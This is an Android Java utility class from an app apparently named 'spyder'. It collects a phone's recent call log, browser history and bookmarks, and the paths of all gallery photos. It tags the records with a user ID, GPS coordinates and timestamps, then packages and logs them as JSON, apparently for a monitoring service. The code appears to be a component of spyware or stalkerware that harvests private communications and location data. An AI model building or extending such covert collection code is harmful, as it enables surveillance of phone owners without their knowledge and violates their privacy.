package com.spyder.app.activitys.util;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.widget.GridView;
import android.widget.Toast;

import com.google.gson.Gson;
import com.spyder.app.activitys.MainActivity;
import com.spyder.app.activitys.presenter.SpyderPresenter;
import com.spyder.app.activitys.request.CallHistoryDetailsPojo;
import com.spyder.app.activitys.request.PhotoDetail;
import com.spyder.app.activitys.request.UserPhotoDetailList;
import com.spyder.app.activitys.view.activities.Browser;
import com.spyder.app.activitys.webservices.GPSTrack;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import static com.spyder.app.activitys.MainActivity.REQUEST_PERMISSIONS;

/**
 * Created by srisailampaka on 11/02/18.
 */

public class GetDetailsInformation {
    public static Context context;
    public static Gson gson = new Gson();
    public static SharedPref sharedPref;
    public static String timeStamp;
    public static SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd-MM-yyyy hh:mm:ssaa");
    public static String getlangitude, getLattitude;
    public static GPSTrack gpsTrack;
    public static List<PhotoDetail> photoDetailList;
    public static SpyderPresenter mSpyderPresenter;
    public static ArrayList<PhotoDetail> saveGalleryPhotoArrayList = new ArrayList<>();
    public static boolean boolean_folder;
    private static final int REQUEST_PERMISSIONS = 100;
    public GetDetailsInformation(Context applicationContext) {

        context = applicationContext;
        sharedPref = new SharedPref(context);
        gpsTrack = new GPSTrack(context);
        getlangitude = gpsTrack.currentLangitude;
        getLattitude = gpsTrack.currentLattitude;
        timeStamp = simpleDateFormat.format(new Date());
    }

    public List<CallHistoryDetailsPojo> getCallHistory() {
        List<CallHistoryDetailsPojo> saveCallHistoryDetailsList = new ArrayList<>();

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.

            String selection= CallLog.Calls.DATE+">"+sharedPref.getOneDayTimestamp();

        Cursor mCursor = context.getApplicationContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, null, selection,
                null, null);
        int number = mCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int date = mCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = mCursor.getColumnIndex(CallLog.Calls.DURATION);
        int type = mCursor.getColumnIndex(CallLog.Calls.TYPE);
        StringBuilder sb = new StringBuilder();
        while (mCursor.moveToNext()) {
            String phnumber = mCursor.getString(number);
            String callduration = mCursor.getString(duration);
            String calltype = mCursor.getString(type);
            String calldate = mCursor.getString(date);
            Date d = new Date(Long.valueOf(calldate));
            String callTypeStr = "";
            switch (Integer.parseInt(calltype)) {
                case CallLog.Calls.OUTGOING_TYPE:
                    callTypeStr = "Outgoing";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    callTypeStr = "Incoming";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    callTypeStr = "Missed";
                    break;
            }
            CallHistoryDetailsPojo callhistory=new CallHistoryDetailsPojo();
            callhistory.setUserId(sharedPref.getUserId());
            callhistory.setPhoneNumber(phnumber);
            callhistory.setDuration(callduration);
            callhistory.setTypeOfCall(callTypeStr);
            callhistory.setTimestamp(String.valueOf(d));
            saveCallHistoryDetailsList.add(callhistory);
            MyLog.log("calldataArray......",gson.toJson(saveCallHistoryDetailsList));
        }
     //   MyLog.log("calldata......",sb.toString());
        // textview.setText(sb.toString());


    }
        return saveCallHistoryDetailsList;}
    public  void getBrowserHistory(){
        Browser browser=new Browser();
        Cursor mCur = context.getApplicationContext().getContentResolver().query(browser.BOOKMARKS_URI, browser.HISTORY_PROJECTION, null, null, null);
        String[] proj = new String[] { com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.TITLE, com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.URL};
        String sel = com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.BOOKMARK + " = 0"; // 0 = history, 1 = bookmark
        mCur = context.getApplicationContext().getContentResolver().query(browser.BOOKMARKS_URI, proj, sel, null, null);
       // context.getApplicationContext().getContentResolver().startManagingCursor(mCur);
        mCur.moveToFirst();

        String title = "";
        String url = "";
        if (mCur.moveToFirst() && mCur.getCount() > 0) {
            boolean cont = true;
            while (mCur.isAfterLast() == false && cont) {
                title = mCur.getString(mCur.getColumnIndex(com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.TITLE));
                url = mCur.getString(mCur.getColumnIndex(com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.URL));

                // Do something with title and url
                MyLog.log("title....",title);
                MyLog.log("url......",url);
                mCur.moveToNext();
            }
        }
    }
    public  void secondmethodBrowserHistory(){
        Browser browser=new Browser();
        String[] projection = new String[] {
                com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.TITLE
                , com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.URL
        };
        Cursor mCur = context.getApplicationContext().getContentResolver().query(browser.BOOKMARKS_URI,
                projection, null, null, null
        );
        mCur.moveToFirst();
        int titleIdx = mCur.getColumnIndex(com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.TITLE);
        int urlIdx = mCur.getColumnIndex(com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.URL);
        while (mCur.isAfterLast() == false) {
//            view.append("n" + mCur.getString(titleIdx));
//            view.append("n" + mCur.getString(urlIdx));
            MyLog.log("2methodtitle....",mCur.getString(titleIdx));
            MyLog.log("2methodurl......",mCur.getString(urlIdx));
            mCur.moveToNext();
        }

    }
    public void lastMethodtypegetBrowserdata(){
        Browser browser=new Browser();
// here another one check below code----is useful for us----????????
        String[] requestedColumns = {
                com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.TITLE,
                com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.VISITS,
                com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.BOOKMARK
        };

        Cursor faves = context.getApplicationContext().getContentResolver().query(browser.BOOKMARKS_URI, requestedColumns,
                com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.BOOKMARK + "=1", null, com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.VISITS);
        //Log.d(DEBUG_TAG, "Bookmarks count: " + faves.getCount());
        int titleIdx = faves.getColumnIndex(com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.TITLE);
        int visitsIdx = faves.getColumnIndex(com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.VISITS);
        int bmIdx = faves.getColumnIndex(com.spyder.app.activitys.view.activities.Browser.BookmarkColumns.BOOKMARK);
        faves.moveToFirst();
        while (!faves.isAfterLast()) {
            Log.d("SimpleBookmarks", faves.getString(bmIdx) + faves.getString(titleIdx) + " visited " + faves.getInt(visitsIdx) + " times : " + (faves.getInt(bmIdx) != 0 ? "true" : "false"));
            faves.moveToNext();
        }
    }
    public void getAllPhotos(){
        if ((ActivityCompat.checkSelfPermission(context.getApplicationContext(),
                Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) && (ContextCompat.checkSelfPermission(context.getApplicationContext(),
                Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)) {
            if ((ActivityCompat.shouldShowRequestPermissionRationale((Activity) context,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE)) && (ActivityCompat.shouldShowRequestPermissionRationale((Activity) context,
                    Manifest.permission.READ_EXTERNAL_STORAGE))) {

            } else {
                ActivityCompat.requestPermissions((Activity) context,
                        new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE},
                        REQUEST_PERMISSIONS);
            }
        }else {
            Log.e("Else","Else");
            fn_imagespath();
        }
    }
    public static List<PhotoDetail> fn_imagespath() {
        saveGalleryPhotoArrayList.clear();
        int int_position = 0;
        Uri uri;
        Cursor cursor;
        int column_index_data, column_index_folder_name;

        String absolutePathOfImage = null;
        uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = {MediaStore.MediaColumns.DATA, MediaStore.Images.Media.BUCKET_DISPLAY_NAME};

        final String orderBy = MediaStore.Images.Media.DATE_TAKEN;
        //String selection=+">"+sharedPref.getOneDayTimestamp()
        cursor = context.getApplicationContext().getContentResolver().query(uri, projection, null, null, orderBy + " DESC");

        column_index_data = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
        column_index_folder_name = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
        while (cursor.moveToNext()) {
            absolutePathOfImage = cursor.getString(column_index_data);
            Log.e("Column", absolutePathOfImage);
                Log.e("Folder", cursor.getString(column_index_folder_name));

            for (int i = 0; i < saveGalleryPhotoArrayList.size(); i++) {
                if (saveGalleryPhotoArrayList.get(i).getStr_folder().equals(cursor.getString(column_index_folder_name))) {
                    boolean_folder = true;
                    int_position = i;
                    break;
                } else {
                    boolean_folder = false;
                }
            }
            if (boolean_folder) {

                ArrayList<String> al_path = new ArrayList<>();
                al_path.addAll(saveGalleryPhotoArrayList.get(int_position).getAl_imagepath());
                al_path.add(absolutePathOfImage);
                saveGalleryPhotoArrayList.get(int_position).setAl_imagepath(al_path);


            } else {
                ArrayList<String> al_path = new ArrayList<>();
                al_path.add(absolutePathOfImage);
                PhotoDetail obj_model = new PhotoDetail();
                obj_model.setUserId(sharedPref.getUserId());
                obj_model.setLattitude(getLattitude);
                obj_model.setLongitude(getlangitude);
                obj_model.setTimestamp(timeStamp);
                obj_model.setStr_folder(cursor.getString(column_index_folder_name));
                obj_model.setAl_imagepath(al_path);
                saveGalleryPhotoArrayList.add(obj_model);
            }

        }
        for (int i = 0; i < saveGalleryPhotoArrayList.size(); i++) {
            Log.e("FOLDER", saveGalleryPhotoArrayList.get(i).getStr_folder());
            for (int j = 0; j < saveGalleryPhotoArrayList.get(i).getAl_imagepath().size(); j++) {
                Log.e("FILE", saveGalleryPhotoArrayList.get(i).getAl_imagepath().get(j));
            }
        }
        UserPhotoDetailList userPhotoDetailList=new UserPhotoDetailList();
        photoDetailList = new ArrayList<>();
        userPhotoDetailList.setPhotoDetails(saveGalleryPhotoArrayList);
        MyLog.log("Todaygetphotodetails", gson.toJson(userPhotoDetailList));
        return saveGalleryPhotoArrayList;
    }

}
